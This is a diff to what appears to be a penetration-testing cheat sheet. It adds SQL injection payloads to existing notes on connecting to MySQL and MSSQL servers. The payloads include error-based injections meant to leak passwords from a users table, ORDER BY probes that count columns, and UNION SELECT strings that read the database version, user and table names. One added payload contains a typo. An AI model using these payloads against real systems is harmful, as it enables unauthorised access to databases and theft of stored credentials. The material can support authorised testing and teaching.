@@ -1,5 +1,5 @@
 
-
+##### Note: make sure to check for error messages.
 #### Connecting to MySQL
 ```
 mysql -h TARGET_IP -u USERNAME -p   // Remote authentication with username and password
@@ -20,10 +20,37 @@ SHOW tables;
 impacket-mssqlclient USER:PASSWORD@IP_ADDRESS -windows-auth
 SELECT @@VERSION;
 
-SELECT name FROM master.dbo.sysdatabases                        // Show databases
-
+SELECT name FROM master.dbo.sysdatabases               // Show databases
+SELECT * FROM TARGET_DB.information_schema.tables;     // Show tables
 
 
 ```
 
 
+#### Enabled error messages
+```
+' or 1=1 in (select @@version) -- -                 
+' or 1=1 in (SELECT password FROM users) -- -         // might show the passwords in the error message.
+```
+
+
+#### MySQL UNION injection
+First, use these payloads ascending until an error occurs:
+```
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+The last number before the error is the amount of columns in the request. Then, use this payload with the appropriate amount of columns:
+```
+' UNION SELECT @@version -- -
+' UNION SELECT null, @@version -- -
+...
+' UNION SELECT null, null, database(), user(), @@version  -- -
+```
+If the payload works, it's time to read the database tables:
+```
+
+' union select null, null, null, null null, table_name from information_schema.columns where table_schema=database() -- //
+
+```
